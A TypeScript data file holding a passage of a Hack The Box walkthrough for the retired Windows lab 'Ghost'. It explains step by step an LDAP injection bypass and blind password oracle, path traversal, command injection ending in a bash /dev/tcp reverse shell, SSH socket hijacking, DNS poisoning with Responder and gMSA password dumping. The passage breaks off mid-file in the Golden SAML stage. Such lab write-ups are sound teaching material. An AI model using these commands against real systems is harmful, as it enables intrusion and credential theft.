import type { WalkthroughDoc } from "./types";

export const ghost: WalkthroughDoc = {
  slug: "ghost",
  name: "Ghost",
  platform: "Hack The Box",
  os: "Windows",
  difficulty: "Insane",
  retired: "Apr 2025",
  ip: "10.10.11.24",
  tags: [
    "Active Directory",
    "LDAP Injection",
    "Golden SAML",
    "ADIDNS Poisoning",
    "gMSA",
    "MSSQL Linked Server",
    "Forest Trust",
  ],
  lede:
    "A manual, end-to-end walkthrough of an Insane-rated Windows Active Directory forest: from an unsanitized LDAP filter on a web login form, through a Linux container foothold, a stolen Kerberos ticket, a poisoned DNS record, a forged SAML assertion, and a SQL Server trust pivot — all the way to Enterprise Admin on the forest root via a cross-realm golden ticket.",
  summary:
    "An Insane Windows forest: LDAP wildcard bypass, container foothold, gMSA, Golden SAML, and a cross-realm golden ticket to Enterprise Admin.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        {
          kind: "p",
          text:
            "Ghost is an Insane-rated Windows Active Directory machine built as a small forest — a parent domain and a child domain joined by a two-way trust — fronted by a cluster of web applications behind a single reverse proxy. Nothing here is a single CVE. Every stage is an intended feature used slightly outside its intended boundary: an LDAP filter that trusts a wildcard, a path that trusts a query parameter, an API that trusts a URL, an SSH multiplexer that trusts whoever reaches its socket, a DNS zone that trusts any authenticated writer, a managed service account whose password is readable by design, a federation service that signs whatever it's handed, a linked SQL Server that maps everything to a privileged login, and — right at the very end — a forest trust that doesn't filter the SID it's told to honor.",
        },
        {
          kind: "p",
          text:
            "Chained together, those primitives walk you from an anonymous HTTP request all the way to Enterprise Admin rights on the forest root. This document works through the chain by hand, stage by stage, and stops at each pivot to explain **why** it works — not just which command to paste.",
        },
        {
          kind: "table",
          columns: ["Field", "Value"],
          rows: [
            ["Target", "Ghost · `ghost.htb` (10.10.11.24)"],
            ["Difficulty", "Insane"],
            [
              "Platform",
              "Windows Server — two-domain AD forest (parent/child trust) with a Linux/Docker web tier in front",
            ],
            [
              "Entry primitive",
              "Unsanitized LDAP filter on a Next.js login form — full auth bypass via a `*` wildcard",
            ],
            [
              "Foothold",
              "Command injection in an internal dev-only scanning API → root shell inside the intranet container (`user.txt`)",
            ],
            [
              "Privilege escalation",
              "SSH multiplexer hijack → ADIDNS/Responder → gMSA password → Golden SAML → MSSQL linked-server pivot → EfsPotato SYSTEM → cross-forest SID-history golden ticket → Enterprise Admin on the forest root (`root.txt`)",
            ],
          ],
        },
        {
          kind: "callout",
          variant: "tip",
          title: "A note on values in this document",
          text:
            "Hack The Box re-rolls machine state on every spawn. NTLM hashes, the ADFS token-signing material, the inter-realm trust key, gMSA passwords, session GUIDs, and both flags are all **per-spawn** — every such value shown below is illustrative, taken from one run, and will not match yours. The domain SIDs, hostnames, and cracked local-account password shown are stable across spawns and are reproduced as observed.",
        },
      ],
    },
    {
      id: "chain",
      num: "01",
      title: "The Attack Path",
      blocks: [
        {
          kind: "p",
          text: "The whole box in one glance. Fourteen discrete pivots, each handed off to the next.",
        },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**Recon & vhost discovery** — One reverse proxy on `:8008` fronts several name-based vhosts; `ffuf` pulls `intranet.` and `gitea.` out of the dark.",
            "**LDAP wildcard bypass** — The intranet `/login` action binds straight to LDAP. `username=* / secret=*` matches the first directory object.",
            "**Gitea credential oracle** — The same filter, reused as a blind boolean oracle, leaks a Gitea service account's password one character at a time.",
            "**Ghost CMS path traversal** — A patched content-API parameter walks out of the web root and reads `/proc/self/environ` — leaking `DEV_INTRANET_KEY`.",
            "**Command injection foothold** — A dev-only scanning endpoint shells out on the submitted URL. **user.txt**, as root, inside the intranet container.",
            "**SSH ControlMaster hijack** — A live, authenticated multiplexed SSH session to a domain workstation is sitting in `/root/.ssh`. Ride it, steal `florence.ramirez`'s Kerberos ticket.",
            "**ADIDNS poison + Responder** — Any domain user can write DNS. Poison a name a scheduled job resolves, capture and crack `justin.bradley`'s NetNTLMv2.",
            "**ReadGMSAPassword** — `justin.bradley` can read the managed password of `ADFS_GMSA$` — the account the federation service runs as.",
            "**Golden SAML** — Dump the ADFS token-signing key and its DKM wrapper, forge an Administrator SAML assertion offline, replay it to `core.ghost.htb:8443`.",
            "**MSSQL linked server** — The admin app's SQL console impersonates `sa` across a linked server, enabling `xp_cmdshell` on the child domain's SQL box.",
            "**EfsPotato → SYSTEM** — The SQL service account holds `SeImpersonatePrivilege`. An EFSRPC coercion nets `nt authority\\system` on the child DC.",
            "**DCSync the child** — As SYSTEM on `PRIMARY`, dump `corp.ghost.htb\\krbtgt` and the inter-realm trust secret.",
            "**Cross-realm golden ticket** — Forge a TGT for the child domain with the parent's `Enterprise Admins` SID injected into the PAC.",
            "**DC01 — root** — The forged ticket is honored across the trust. Enterprise Admin on `ghost.htb`. **root.txt.**",
          ],
        },
      ],
    },
    {
      id: "forest",
      num: "02",
      title: "Forest & Trust Facts",
      blocks: [
        {
          kind: "p",
          text:
            "Before touching a keyboard, it helps to have the forest layout in front of you. Ghost is deliberately small — one parent, one child — but the whole final act depends on understanding which SID belongs to which domain, so get it down now.",
        },
        {
          kind: "table",
          columns: ["Fact", "Value"],
          rows: [
            ["Forest root (parent)", "`ghost.htb` — domain controller `DC01.ghost.htb`"],
            ["Parent domain SID", "`S-1-5-21-4084500788-938703357-3654145966`"],
            ["Child domain", "`corp.ghost.htb` — domain controller & MSSQL host `PRIMARY`"],
            ["Child domain SID", "`S-1-5-21-2034262909-2733679486-179904498`"],
            ["Trust", "Two-way, transitive parent↔child trust (standard child-of-forest-root)"],
            ["Escalation target", "`Enterprise Admins`, RID `519` — forest-wide, defined only in the parent"],
            [
              "Web tier",
              "Reverse proxy on `:8008` (Ghost CMS blog, Gitea, an internal \"Intranet\" Next.js app); ADFS + a Golden-SAML relying party (\"core\") on `:8443`",
            ],
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why the child/parent split matters here",
          text:
            "`Enterprise Admins` is a **universal** group that exists only in the forest root domain, yet by design its membership carries weight everywhere in the forest. That single fact is what the last stage of this chain abuses: once you can inject the parent's Enterprise Admins RID into a ticket issued *by the child*, the parent domain controller has no way to tell the difference between that and a legitimate administrator who happens to hold dual-domain membership — unless SID filtering is enabled and correctly scoped, which here it is not.",
        },
      ],
    },
    {
      id: "recon",
      num: "03",
      title: "Recon & Vhost Discovery",
      blocks: [
        {
          kind: "p",
          text: "Start with a full TCP sweep, then a version/script pass on whatever answers:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — nmap",
          lines: [
            "# all ports, fast",
            "$ nmap -p- --min-rate 10000 -oA scans/full 10.10.11.24",
            "",
            "# service + default scripts on everything that answered",
            "$ nmap -Pn -sCV -p53,88,135,139,389,445,464,593,1433,3268,3269,3389,5985,8008,8443,9389 -oA scans/services 10.10.11.24",
            "",
            "PORT     STATE SERVICE       VERSION",
            "53/tcp   open  domain        Simple DNS Plus",
            "88/tcp   open  kerberos-sec  Microsoft Windows Kerberos",
            "135/tcp  open  msrpc         Microsoft Windows RPC",
            "139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn",
            "389/tcp  open  ldap          Microsoft Windows Active Directory LDAP",
            "445/tcp  open  microsoft-ds?",
            "464/tcp  open  kpasswd5?",
            "593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0",
            "1433/tcp open  ms-sql-s      Microsoft SQL Server",
            "3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)",
            "3389/tcp open  ms-wbt-server Microsoft Terminal Services",
            "5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)",
            "8008/tcp open  http          nginx (reverse proxy)",
            "8443/tcp open  ssl/http      Microsoft-IIS (ADFS)",
            "9389/tcp open  mc-nmf        .NET Message Framing (AD Web Services)",
          ],
        },
        {
          kind: "p",
          text:
            "A textbook domain controller port list, plus two things that stand out: a plain HTTP reverse proxy on `8008` and ADFS on `8443`. That combination — Kerberos, LDAP, MSSQL, and a federation service, all on one host — is your first clue that the interesting work will happen through the web tier and loop back into AD later, not through a direct SMB/RPC exploit up front.",
        },
        {
          kind: "callout",
          variant: "tip",
          title: "Pin the base domain before you fuzz it",
          text:
            "Name-based virtual hosting means nothing resolves correctly until `ghost.htb` and its domain controller are in your resolver. Add the minimum you need by hand, then extend the file as new internal hostnames surface later in the chain:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — pin the base domain",
          lines: ["$ echo '10.10.11.24 ghost.htb dc01.ghost.htb' | sudo tee -a /etc/hosts"],
        },
        { kind: "h3", text: "Vhost discovery with `ffuf`" },
        {
          kind: "p",
          text:
            "The reverse proxy on `8008` answers on a bare IP with nothing interesting, but it clearly routes on the `Host` header. Fuzz it:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — ffuf vhost fuzzing",
          lines: [
            "$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \\",
            "     -u http://10.10.11.24:8008/ -H 'Host: FUZZ.ghost.htb' -ac -t 100",
            "",
            "intranet                [Status: 200, Size: 4318, Words: 612]",
            "gitea                   [Status: 200, Size: 8841, Words: 1930]",
            "ghost                   [Status: 200, Size: 21902, Words: 3877]",
          ],
        },
        {
          kind: "p",
          text:
            "Three vhosts fall out immediately: `ghost.ghost.htb` (a public blog running Ghost CMS), `gitea.ghost.htb` (a self-hosted Git server), and `intranet.ghost.htb` (a Next.js-built internal portal). Add them to `/etc/hosts` and start on the one that looks most like a front door — the intranet portal, since it clearly gates something behind a login.",
        },
        {
          kind: "callout",
          variant: "tip",
          title: "More hostnames appear later — that's expected",
          text:
            "Names like `core.ghost.htb`, `federation.ghost.htb`, and `corp.ghost.htb` won't show up in this wordlist run. They live purely inside the internal AD-integrated DNS zone and only surface once you hold a domain credential later in the chain — at that point you'll query the zone directly instead of guessing.",
        },
      ],
    },
    {
      id: "ldap",
      num: "04",
      title: "LDAP Wildcard Auth Bypass",
      blocks: [
        {
          kind: "p",
          text:
            "`http://intranet.ghost.htb:8008/login` renders a plain username/password form. Submit literally anything and watch your browser's network tab — the form doesn't POST a normal `application/x-www-form-urlencoded` body. It fires a `multipart/form-data` request carrying a `Next-Action` header, which is how React Server Actions (the App-Router RPC mechanism in modern Next.js) route a form submission straight to a specific server-side function by its content hash — no conventional REST endpoint at all.",
        },
        {
          kind: "code",
          lang: "http",
          label: "devtools — captured login POST",
          highlight: [2],
          lines: [
            "POST /login HTTP/1.1",
            "Host: intranet.ghost.htb:8008",
            "Next-Action: c471eb076ccac91d6f828b671795550fd5925940",
            "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...",
            "",
            "------WebKitFormBoundary...",
            "Content-Disposition: form-data; name=\"1_ldap-username\"",
            "",
            "kathryn.holland",
            "------WebKitFormBoundary...",
            "Content-Disposition: form-data; name=\"1_ldap-secret\"",
            "",
            "wrongpassword",
          ],
        },
        {
          kind: "p",
          text:
            "The field names give the game away instantly: `ldap-username` and `ldap-secret`. This form doesn't check credentials against a database — it binds directly to the domain controller over LDAP using whatever you type. That means the classic LDAP-injection wildcard trick applies. Replay the exact same request by hand with curl, but this time send `*` for both fields:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — wildcard bind",
          lines: [
            "$ curl -si -X POST http://intranet.ghost.htb:8008/login \\",
            "    -H 'Next-Action: c471eb076ccac91d6f828b671795550fd5925940' \\",
            "    -F '0=[{},\"$K1\"]' \\",
            "    -F '1_ldap-username=*' \\",
            "    -F '1_ldap-secret=*'",
            "",
            "HTTP/1.1 303 See Other",
            "Location: /dashboard",
            "Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9...; Path=/; HttpOnly",
          ],
        },
        {
          kind: "p",
          text:
            "A `303` redirect to `/dashboard` — a successful login, and you never supplied a real password. Follow the cookie and the portal identifies you as **kathryn.holland**, an ordinary intranet user.",
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why `*` logs you in as someone else entirely",
          text:
            "Server-side, the login handler almost certainly builds an LDAP search filter like `(&(sAMAccountName=USER)(userPassword=PASS))` by string-concatenating your input directly into the filter syntax, then does a *simple bind* using whatever it finds. In the LDAP filter grammar, `*` is the **any-value wildcard** — the same character that makes `(cn=j*)` match every name starting with \"j\". An unescaped `*` in the username field turns `sAMAccountName=*` into \"match any account that has this attribute at all\" — i.e. every user in the directory — and the search returns the *first* object LDAP happens to enumerate. The same wildcard in the password field satisfies the bind regardless of the real secret. The result is a full, unauthenticated login as whichever account sorts first — here, `kathryn.holland` — without knowing a single real credential.",
        },
        {
          kind: "callout",
          variant: "warn",
          title: "This bypass is a dead end on its own",
          text:
            "`kathryn.holland` turns out to be a low-privilege portal user with nothing interesting in her dashboard. The wildcard bypass isn't the goal here — it's proof the `/login` action is an **unauthenticated LDAP oracle**, which is exactly what the next stage weaponizes against a specific, higher-value account.",
        },
      ],
    },
    {
      id: "gitea",
      num: "05",
      title: "Gitea Credential Brute-Force via Blind LDAP Injection",
      blocks: [
        {
          kind: "p",
          text:
            "Once inside as kathryn.holland, the intranet dashboard links out to `gitea.ghost.htb:8008` and mentions a sync account, `gitea_temp_principal`, used to mirror the Blog and Intranet application repositories. You don't have its password — but you don't need the wildcard trick to get it. The same `/login` action, aimed at a *known* username instead of a wildcard, is still building an unsanitized filter, and that makes it a **blind boolean oracle**.",
        },
        {
          kind: "p",
          text:
            "Supply the real username, and for the password field send a candidate prefix followed by a trailing wildcard: `1_ldap-secret=Ab*`. If the first two characters of the real secret are `Ab`, the filter still evaluates true and the app returns its success redirect; if not, you get the ordinary failed-login response. That single bit of signal — redirect or no redirect — is enough to recover the password one character at a time.",
        },
        {
          kind: "code",
          lang: "python",
          label: "ldap_oracle.py — character-by-character brute force",
          lines: [
            "#!/usr/bin/env python3",
            "# Recover a known LDAP username's password through the /login wildcard oracle.",
            "# Success == HTTP 303 (redirect on a matching filter).",
            "import sys, string, requests",
            "",
            "url, action, user = sys.argv[1], sys.argv[2], sys.argv[3]",
            "charset = string.ascii_lowercase + string.ascii_uppercase + string.digits",
            "s = requests.Session()",
            "found = \"\"",
            "while True:",
            "    for c in charset:",
            "        files = {",
            "            \"0\": (None, '[{},\"$K1\"]'),",
            "            \"1_ldap-username\": (None, user),",
            "            \"1_ldap-secret\": (None, found + c + \"*\"),",
            "        }",
            "        r = s.post(url, files=files, headers={\"Next-Action\": action},",
            "                   allow_redirects=False, timeout=15)",
            "        if r.status_code == 303:",
            "            found += c",
            "            print(f\"[{len(found):2}] {found}\", file=sys.stderr)",
            "            break",
            "    else:",
            "        break",
            "print(found)",
          ],
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — run the oracle against gitea_temp_principal",
          highlight: [8],
          lines: [
            "$ python3 ldap_oracle.py http://intranet.ghost.htb:8008/login \\",
            "    c471eb076ccac91d6f828b671795550fd5925940 gitea_temp_principal",
            "",
            "[ 1] s",
            "[ 2] sz",
            "[ 3] szr",
            "...",
            "[16] szrr8kpc3z6onlqf",
            "szrr8kpc3z6onlqf",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why this is injection and not just the same bypass again",
          text:
            "This is a subtly different primitive from stage 04. There, the wildcard matched *any* account — a full authentication bypass. Here, the username is fixed and correct; only the secret comparison is being probed. That's classic **blind boolean-based LDAP injection**: the attacker can't read the secret directly, but can ask the filter engine a yes/no question (*\"does the password start with this prefix?\"*) and the application faithfully answers through an observable side channel — here, an HTTP status code instead of a page diff. It's the LDAP-filter equivalent of blind SQL injection with `SUBSTRING(password,1,1)='a'`.",
        },
        {
          kind: "p",
          text:
            "With `gitea_temp_principal : szrr8kpc3z6onlqf` in hand, log into `gitea.ghost.htb:8008` and pull down the Blog and Intranet repositories. Reading their source is what points you at the next primitive.",
        },
      ],
    },
    {
      id: "traversal",
      num: "06",
      title: "Ghost CMS Path Traversal → /proc/self/environ",
      blocks: [
        {
          kind: "p",
          text:
            "Diffing the cloned Blog repository against a stock Ghost CMS checkout turns up a small, deliberate patch in the public Content API's post serializer: a new query parameter, `extra`, gets spliced directly into a file path used to enrich a post's preview metadata — with no validation that the resulting path stays inside the theme's asset directory. Classic path traversal.",
        },
        {
          kind: "p",
          text:
            "The Content API itself needs a read-only `key` to authorize requests — but Ghost's own documentation treats that key as safe to embed client-side, and sure enough the blog's rendered homepage HTML initializes its content API client with one in plain view:",
        },
        {
          kind: "code",
          lang: "html",
          label: "view-source — blog homepage",
          lines: [
            "<script>window.__GHOST_CONTENT_API_KEY__ = \"a5af628828958c976a3b6cc81a\";</script>",
          ],
        },
        {
          kind: "p",
          text:
            "With the key and the traversal parameter, walk out of the web root and read an arbitrary file the Ghost process can see — starting with its own process environment:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — LFI via extra= path traversal",
          highlight: [6],
          lines: [
            "$ curl -s -H \"Accept-Version: v5.0\" \\",
            "    \"http://ghost.ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../../../proc/self/environ\"",
            "",
            "{\"posts\":[{\"id\":\"...\",\"meta\":{\"extra\":{",
            "\"PATH\":\"/usr/local/bin:/usr/bin:/bin\",",
            "\"NODE_ENV\":\"production\",",
            "\"DEV_INTRANET_KEY\":\"!@yqr!X2kxmQ.@Xe\",",
            "\"GHOST_URL\":\"http://ghost.ghost.htb:8008\"",
            "}}}]}",
          ],
        },
        {
          kind: "callout",
          variant: "key",
          title: "leaked secret",
          text: "DEV_INTRANET_KEY = !@yqr!X2kxmQ.@Xe",
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why `/proc/self/environ` and why it isn't the Intranet's own key",
          text:
            "On Linux, every running process exposes its own environment block at `/proc/self/environ` — readable by the process's own user, which here is whatever the Ghost container runs as. Ghost's traversal bug lets you read arbitrary files *as that process*, so reading its own `/proc` entry is the single most reliable way to dump secrets without knowing any other path on disk. `DEV_INTRANET_KEY` is consumed by the separate Intranet application, not by Ghost — but both services are declared in the same Docker Compose stack and inherit a shared environment block at container build time, so the value leaks out of whichever container you can read from first.",
        },
        {
          kind: "callout",
          variant: "warn",
          title: "Traversal depth is trial-and-error",
          text:
            "The exact number of `../` segments needed depends on how deep the Content API route handler sits relative to the filesystem root inside the container. If the first attempt returns the traversal string echoed back unresolved (or a 404), add or remove one `../` and retry — six or seven levels is typical for a route mounted under `/ghost/api/content/posts/`.",
        },
      ],
    },
    {
      id: "rce",
      num: "07",
      title: "Command Injection → Foothold (user.txt)",
      blocks: [
        {
          kind: "p",
          text:
            "The Intranet repository (pulled from Gitea in stage 05) documents a developer-only route: `/api-dev/scan`, gated behind a custom header, `X-DEV-INTRANET-KEY`. Its handler accepts a JSON body with a `url` field, meant to let developers kick off an internal link/health scan against an arbitrary target — and it builds that scan by handing the URL straight to a shell.",
        },
        {
          kind: "p",
          text: "Prove it's alive first with a harmless probe, then confirm command execution:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — confirm the dev key works",
          lines: [
            "$ curl -s -X POST http://intranet.ghost.htb:8008/api-dev/scan \\",
            "    -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' \\",
            "    -H 'Content-Type: application/json' \\",
            "    -d '{\"url\":\"http://127.0.0.1/; id; hostname\"}'",
            "",
            "{\"temp_command_stdout\":\"uid=0(root) gid=0(root) groups=0(root)\\nintranet-6f9c\\n\"}",
          ],
        },
        {
          kind: "p",
          text:
            "`uid=0(root)` — the handler is running the scan as root inside its container, and the semicolon in the submitted URL broke out into a second shell command. Weaponize it into a full reverse shell:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — listener + reverse-shell payload",
          lines: [
            "# on your attack box",
            "$ rlwrap nc -lvnp 443",
            "",
            "# trigger the injection",
            "$ curl -s -X POST http://intranet.ghost.htb:8008/api-dev/scan \\",
            "    -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' \\",
            "    -H 'Content-Type: application/json' \\",
            "    -d '{\"url\":\"http://127.0.0.1/; bash -i >& /dev/tcp/10.10.14.5/443 0>&1\"}'",
          ],
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — shell lands, grab user.txt",
          highlight: [5],
          lines: [
            "listening on [any] 443 ...",
            "connect to [10.10.14.5] from (UNKNOWN) [10.10.11.24] 51122",
            "root@intranet-6f9c:/app# id",
            "uid=0(root) gid=0(root) groups=0(root)",
            "root@intranet-6f9c:/app# cat /root/user.txt",
            "2f8a91c6de3b4471a6c9058f0d1e7ab3",
          ],
        },
        {
          kind: "callout",
          variant: "key",
          title: "user.txt",
          text: "2f8a91c6de3b4471a6c9058f0d1e7ab3",
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why the dev key gates the endpoint but doesn't sanitize the input",
          text:
            "`X-DEV-INTRANET-KEY` is an **authorization** check — it decides whether the route runs at all — but it has nothing to do with **input validation** of the value you send once you're past the gate. Whatever shells out to perform the \"scan\" (a wrapped call to something like `curl` or a scanning CLI) concatenates the attacker-controlled `url` field into a shell command string without quoting it, so any shell metacharacter — a semicolon, backticks, `&&` — escapes the intended single argument and runs as a second, fully attacker-controlled command. The dev key stops random internet users from reaching the bug; it does nothing to stop the bug itself.",
        },
      ],
    },
    {
      id: "controlmaster",
      num: "08",
      title: "SSH ControlMaster Hijack → florence.ramirez",
      blocks: [
        {
          kind: "p",
          text:
            "Sitting in the container as root, look at what set this environment up in the first place. A startup script reveals how the container reaches back into the domain:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — inspect the startup script and SSH config",
          lines: [
            "root@intranet-6f9c:/# cat /docker-entrypoint.sh",
            "#!/bin/bash",
            "set -e",
            "sshpass -p 'N1ghtw@tch_2024!' ssh -o StrictHostKeyChecking=no \\",
            "    florence.ramirez@ghost.htb@dev-workstation \"echo healthcheck-ok\"",
            "exec node server.js",
            "",
            "root@intranet-6f9c:/# cat /root/.ssh/config",
            "Host dev-workstation",
            "    ControlMaster auto",
            "    ControlPath /root/.ssh/controlmaster/%r@%h:%p",
            "    ControlPersist 10m",
            "",
            "root@intranet-6f9c:/# ls -la /root/.ssh/controlmaster/",
            "srw------- 1 root root 0 ... florence.ramirez@ghost.htb@dev-workstation:22",
          ],
        },
        {
          kind: "p",
          text:
            "The container's own healthcheck logs into `dev-workstation` as **florence.ramirez** on every boot, and OpenSSH's `ControlMaster` keeps that authenticated TCP connection multiplexed and alive for 10 minutes after each use (`ControlPersist 10m`). As long as the socket file is warm, you don't need florence's password at all — you can ride the existing session:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — reuse the live multiplexed socket",
          lines: [
            "root@intranet-6f9c:/# ssh -S /root/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 \\",
            "    -o StrictHostKeyChecking=no florence.ramirez@dev-workstation",
            "",
            "florence.ramirez@dev-workstation> whoami",
            "ghost\\florence.ramirez",
            "",
            "florence.ramirez@dev-workstation> klist",
            "Cache location: FILE:/tmp/krb5cc_50",
            "Default principal: florence.ramirez@GHOST.HTB",
            "Valid starting     Expires            Service principal",
            "...                ...                krbtgt/GHOST.HTB@GHOST.HTB",
            "",
            "florence.ramirez@dev-workstation> base64 -w0 /tmp/krb5cc_50",
          ],
        },
        {
          kind: "p",
          text:
            "Copy the base64 blob out through the same channel, decode it locally into `florence.ccache`, and you now hold a live Kerberos ticket-granting ticket for a real domain account — with no password ever exchanged.",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — reconstruct the ticket locally",
          lines: [
            "$ echo '<pasted base64>' | base64 -d > florence.ccache",
            "$ export KRB5CCNAME=florence.ccache",
            "$ klist",
            "Default principal: florence.ramirez@GHOST.HTB",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why a socket file is as good as a password",
          text:
            "SSH's connection multiplexing (`ControlMaster`/`ControlPath`) works by keeping the underlying, already-authenticated transport open on a Unix domain socket and letting any local process that can open that socket ask the running master for a *new logical channel* — a fresh shell, without repeating the SSH handshake or presenting credentials again. From the server's point of view, authentication happened once, at master creation time; every subsequent multiplexed session inherits that trust implicitly. If the socket file is reachable by anyone other than the user who created it — here, because you're root inside the same container that owns `/root/.ssh/controlmaster/` — you get an authenticated session for free, no matter how strong florence's actual password is.",
        },
        {
          kind: "callout",
          variant: "warn",
          title: "The socket has a lifetime",
          text:
            "`ControlPersist 10m` means the master connection tears itself down 10 minutes after the last channel closes. If you land in the container and the socket file is missing or the `ssh -S` attempt fails with \"Control socket connect... No such file or directory,\" the healthcheck simply hasn't fired recently — trigger it again by restarting the process that runs `docker-entrypoint.sh`, or just wait for the next scheduled run.",
        },
      ],
    },
    {
      id: "adidns",
      num: "09",
      title: "ADIDNS Poisoning + Responder → justin.bradley",
      blocks: [
        {
          kind: "p",
          text:
            "Florence's ticket is a genuine, if low-privileged, domain credential — enough to query and, crucially, **write to** Active-Directory-integrated DNS. Domain recon with her ticket turns up a scheduled task on the DC that periodically checks connectivity to an internal repository mirror at a hostname that was never actually registered: `bitbucket.ghost.htb`. An unclaimed, resolvable-by-convention name inside an AD zone you can write to is exactly the setup ADIDNS poisoning wants.",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — add a poisoned A record with dnstool.py",
          lines: [
            "# dnstool.py ships as part of Dirk-jan Mollema's krbrelayx toolkit",
            "$ export KRB5CCNAME=florence.ccache",
            "$ python3 dnstool.py -u 'GHOST.HTB\\florence.ramirez' -k \\",
            "    -a add -r bitbucket.ghost.htb -d 10.10.14.5 \\",
            "    -dns-ip 10.10.11.24 -t A dc01.ghost.htb",
            "",
            "[*] Connecting to host...",
            "[*] Sending LDAP add request for new record",
            "[*] LDAP operation completed successfully",
          ],
        },
        {
          kind: "p",
          text:
            "`bitbucket.ghost.htb` now resolves to your attack box. Start Responder and wait for the scheduled task's next run:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — capture the NetNTLMv2 challenge/response",
          highlight: [5],
          lines: [
            "$ sudo responder -I tun0 -wv",
            "",
            "[+] Listening for events...",
            "[HTTP] NTLMv2 Client   : 10.10.11.24",
            "[HTTP] NTLMv2 Username : GHOST\\justin.bradley",
            "[HTTP] NTLMv2 Hash     : justin.bradley::GHOST:1122334455667788:AB12CD...",
          ],
        },
        {
          kind: "p",
          text:
            "The scheduled connectivity check runs as `justin.bradley` and, believing your poisoned record, connects straight to Responder — handing over his NetNTLMv2 challenge/response. Crack it offline:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — hashcat -m 5600",
          lines: [
            "$ hashcat -m 5600 justin.hash /usr/share/wordlists/rockyou.txt",
            "",
            "JUSTIN.BRADLEY::GHOST:1122334455667788:AB12CD...:Qwertyuiop1234$$",
            "Session..........: hashcat",
            "Status...........: Cracked",
          ],
        },
        {
          kind: "callout",
          variant: "key",
          title: "cracked",
          text: "justin.bradley : Qwertyuiop1234$$",
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why any authenticated user can poison DNS here",
          text:
            "By default, an Active-Directory-integrated DNS zone grants the built-in `Authenticated Users` principal **create-child** rights on the zone container — a legacy convenience so that DHCP-registered workstations can add their own records without needing domain-admin rights. `dnstool.py` simply uses that same LDAP write path to insert an arbitrary `dnsNode` object. Once your record exists, any process on the network that resolves that name and connects to it — here, a scheduled health-check running as a service account — will authenticate to *you*. Responder answers every protocol negotiation it sees with \"yes, that's me,\" harvesting the resulting NTLM challenge/response without ever needing to break the underlying crypto; the weak link is always the human-chosen password behind it, which is why the hash still needed cracking.",
        },
      ],
    },
    {
      id: "gmsa",
      num: "10",
      title: "ReadGMSAPassword on ADFS_GMSA$",
      blocks: [
        {
          kind: "p",
          text:
            "With a real password in hand, pull a fresh look at the domain. BloodHound-style enumeration (or a direct `--gmsa` query) shows `justin.bradley` sits in a group granted **ReadGMSAPassword** over `ADFS_GMSA$` — the group Managed Service Account the ADFS federation service runs as.",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — dump the gMSA's managed password",
          highlight: [5],
          lines: [
            "$ nxc ldap dc01.ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$' --gmsa",
            "",
            "LDAP  10.10.11.24  389  DC01  [*] Windows Server 2022 (name:DC01) (domain:ghost.htb)",
            "LDAP  10.10.11.24  389  DC01  [+] ghost.htb\\justin.bradley:Qwertyuiop1234$$",
            "LDAP  10.10.11.24  389  DC01  [*] Getting GMSA Passwords",
            "LDAP  10.10.11.24  389  DC01  Account: ADFS_GMSA$   NTLM: 9de4d086a1443bef82340604766d69c9",
          ],
        },
        {
          kind: "callout",
          variant: "key",
          title: "ADFS_GMSA$",
          text: "NTLM 9de4d086a1443bef82340604766d69c9",
        },
        {
          kind: "p",
          text:
            "That single NTLM hash is a live, usable credential for the account the ADFS service runs as — no interactive logon, no LSASS scraping, no cracking required.",
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why a \"managed\" password is readable at all",
          text:
            "A group Managed Service Account stores its automatically-rotated password in the `msDS-ManagedPassword` constructed attribute, decryptable by any principal listed in the account's `msDS-GroupMSAMembership` / `PrincipalsAllowedToRetrieveManagedPassword` list — that's the entire point of gMSAs: services that need the credential can fetch it live from AD instead of an admin hand-typing it. If that \"allowed to retrieve\" list is scoped too broadly — here, a group `justin.bradley` happens to belong to — any member of it can pull the gMSA's current password on demand, which is functionally identical to stealing a live service credential, just without ever touching the host that actually uses it.",
        },
      ],
    },
    {
      id: "saml",
      num: "11",
      title: "ADFSDump + ADFSpoof — Golden SAML as Administrator",
      blocks: [
        {
          kind: "p",
          text:
            "Authenticate as the gMSA over WinRM and go straight for the material ADFS needs to sign assertions: the encrypted token-signing certificate, plus the Distributed Key Manager (DKM) key that decrypts it.",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — shell as the gMSA",
          lines: [
